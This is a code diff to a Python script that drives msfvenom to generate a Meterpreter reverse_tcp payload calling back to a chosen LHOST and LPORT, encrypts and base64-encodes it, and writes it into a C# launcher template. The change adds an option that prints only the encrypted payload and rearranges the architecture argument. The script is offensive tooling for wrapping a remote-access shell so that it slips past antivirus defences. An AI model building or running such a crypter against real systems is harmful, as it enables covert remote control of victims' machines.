@@ -12,12 +12,12 @@ def main():
 	payload = args.payload
 	filename = args.filename
 	arch = args.arch
+	base64only = args.base64only
 
 	''' generate msfvenom payload '''
 	print("[+] Generating MSFVENOM payload...")
 	result = subprocess.run(['msfvenom',
 		'-p', payload,
-		'-a', arch,
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
 		'-f', 'raw'],
@@ -29,6 +29,13 @@ def main():
 	hkey = hash_key(key)
 	encrypted = encrypt(hkey, hkey[:16], buf)
 	b64 = base64.b64encode(encrypted)
+
+	''' if only base64 output needed'''
+	if(base64only == True):
+		print("[+] Base64 output:")
+		print(b64.decode('utf-8'))
+		print("\n[+] Have a nice day!")
+		return
 
 	''' change template '''
 	print("[+] Generating launcher.cs file...")
@@ -87,10 +94,13 @@ def parse_args():
 			help="The local host that msfconsole is listening on.")
 	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
 		help="The payload to generate in msfvenom.")
-	parser.add_argument("-a", "--arch", default="x86",
-		help="The target architecture (x64 or x86)")
 	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
-		help="The filename of the executable.")
+		help="The filename of the launcher.")
+	parser.add_argument("-a", "--arch", default="x86",
+		help="The target architecture (x64 or x86) for Mono.")
+	parser.add_argument("-b", "--base64only", action="store_true",
+		help="Output the base64 encrypted payload only.")
+
 
 	return parser.parse_args()
 
